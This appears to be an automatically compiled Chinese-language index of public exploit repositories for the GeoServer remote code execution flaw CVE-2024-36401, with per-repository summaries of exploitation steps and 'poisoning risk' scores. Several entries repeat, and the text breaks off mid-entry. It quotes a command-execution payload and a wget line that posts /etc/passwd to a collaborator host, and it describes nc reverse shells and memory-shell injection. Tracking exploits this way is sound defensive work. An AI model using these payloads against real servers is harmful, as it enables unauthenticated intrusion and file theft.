**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

